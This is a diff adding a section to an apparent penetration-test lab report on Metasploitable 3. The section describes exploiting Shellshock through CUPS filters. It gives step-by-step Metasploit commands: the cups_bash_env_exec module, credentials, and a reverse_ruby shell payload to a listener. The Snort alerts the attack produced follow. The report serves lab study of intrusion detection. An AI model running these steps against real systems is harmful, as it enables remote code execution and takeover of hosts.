@@ -45,3 +45,35 @@ This report details the penetration testing performed on the [Metasploitable 3 (
 ```
 [**] [1:2012887:2] ET POLICY HTTP POST contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 172.28.128.1:58460 -> 172.28.128.3:80 
 ```
+
+
+
+## IDENTIFIED ATTACK 3: CUPS Filter Bash Environment Variable Code Injection (Shellshock)
+
+### Description
+
+**Component Targeted:** CUPS (Common UNIX Printing System)
+
+**Execution Method:** This attack exploits a remote code execution vulnerability in the CUPS printing system by leveraging the Shellshock vulnerability in Bash. The vulnerability allows an attacker to inject and execute arbitrary code via manipulated environment variables passed to the CUPS filters.
+
+**Preparation:** Before performing the attack, ensure the `vagrant` user is added to the `lpadmin` group on the Metasploitable box, as the exploit requires elevated privileges to execute properly.
+```
+usermod -a -G lpadmin vagrant
+```
+
+**Steps in Metasploit:**
+1. Select the exploit: `use exploit/multi/http/cups_bash_env_exec`
+2. Set the target IP: `set RHOST <target_ip>`
+3. Set the CUPS username: `set HttpUsername vagrant`
+4. Set the CUPS password: `set HttpPassword vagrant`
+5. Set the payload to use a reverse TCP connection: `set PAYLOAD cmd/unix/reverse_ruby`
+6. Configure the local host IP for the payload: `set LHOST  <listen_ip>`
+7. Execute the attack: `run`
+
+**Snort Output:**
+```
+[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58859 -> 172.28.128.3:631                                                                
+[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58862 -> 172.28.128.3:631                                                                
+[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58864 -> 172.28.128.3:631                                                                
+[**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:58864 -> 172.28.128.3:631 
+```
